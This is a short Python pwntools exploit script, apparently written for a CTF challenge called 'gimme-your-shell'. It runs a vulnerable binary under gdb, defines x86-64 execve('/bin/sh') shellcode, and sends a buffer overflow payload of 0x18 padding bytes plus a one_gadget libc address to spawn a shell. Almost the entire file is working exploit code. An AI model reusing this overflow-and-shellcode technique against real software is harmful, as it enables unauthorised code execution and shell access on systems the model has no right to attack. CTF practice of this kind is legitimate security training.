from pwn import *


binname = './weak'
context.binary = binname
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']


elf = ELF(binname)
libc = elf.libc


gdbscript = '''
pwn
b main
'''
io = gdb.debug([binname], aslr=False, gdbscript=gdbscript)

# s = ssh('user', 'gimme-your-shell.ctf.insecurity-insa.fr', 2225, keyfile='./id_inshack')
# io = s.shell()
io.interactive()

print io.recvline()

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
one_gadget = 0x7ffff79e4000 + 0x4f2c5
payload = 'A' * 0x18 + p64(one_gadget)
io.sendline(payload)

io.interactive()
